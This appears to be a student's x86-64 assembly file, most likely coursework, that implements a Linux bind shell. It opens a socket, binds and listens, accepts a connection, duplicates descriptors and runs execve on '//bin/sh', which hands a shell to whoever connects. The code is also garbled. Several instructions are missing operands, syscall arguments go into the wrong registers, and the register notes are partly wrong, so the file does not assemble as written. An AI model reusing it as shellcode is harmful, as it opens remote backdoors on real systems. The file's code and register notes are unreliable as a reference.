; Tuguldur Erdenebat 261842
;; Collaborated (discussion) with Chris Paris 
	
bits 64

section .text
    global _start

;;;;;;;;;;;;NOTES;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
        ; function args 1:rdi, 2:rsi, 3:rcx, 4:rdx, 5:r8, 6:r9
        ; frame pointer: rbp
        ; function return value: rax

        ; sys_write(int fd, const void buf[.count], size_t count)
        ; rax = 1

        ; sys_read(int fd, void buf[.count], size_t count)
        ; rax = 0

        ;convention: syscall NR:rax, return:rax, arg0:rdi, arg1:rsi, arg2:rdx, arg3:r10  ...r8...r9
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

	;; similar to inetd function in C
_start:

	;; setup socket(#41)
	;; int socket(int domain, int type, int protocol)
	;; socket(AF_INET,SOCK_STREAM,0)
	mov al, 41 		;set syscall number to socket
	mov dil, 2		;set domain to 2
	mov rsi, 1		;set type as 1
	mov rcx, 0		;set protocol as 0
	syscall

	;; create a sockaddr struct on the stack
	sub rsp, 16
	mov word [rsp], 2
	mov word [rsp+2],
	mov dword [rsp+4],
	mov qword [rsp+8], 0
	
        ;setup bind
	;int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
	mov al, 49; set syscall number to (bind)
	mov rdi, rax  ;set sockfd 
	mov rsi, rsp ; set sockaddr
	mov rcx, 16 ;set addrlen
	syscall

	;; setup listen
	;; int listen(int sockfd, int backlog)
	mov al, 50
	mov dil,  ;set 
	mov rsi, 1 ; set 
	syscall

	;; Accept
	;; int accept(int sockfd, struct sockaddr *_Nullable restrict addr, socklen_t *Nullable restrict addrlen) 
	mov al, 43
	mov dil,  ;set 
	mov rsi, 1 ; set
	mov rcx, 16
	syscall

	;; dup2
	;; int dup2(int oldfd, int newfd) 
	mov al, 33
	mov dil,  ;set 
	mov rsi, 1 ; set
	syscall


	;; execve
	xor rax, rax ;zero out rax
	mov rdi, 0x68732f6e69622f2f ;//bin/sh
	push rax ;null value on stack
	mov rsi, rsp ;argv set to 0
	mov rdx, rsp ;envp set to 0
	push rdi ;push //bin/sh to stack
	mov rdi, rsp ;set rdi to //bin/sh address
	mov al, 59;execve system call number
	syscall

.done:

	;syscall for exit
	xor rax, rax
	mov al, 60    ;syscall for sys_exit
	mov dil, 1  ;set status code to (success + 1)
	sub dil, 1  ;set status code 0 (success)
	syscall
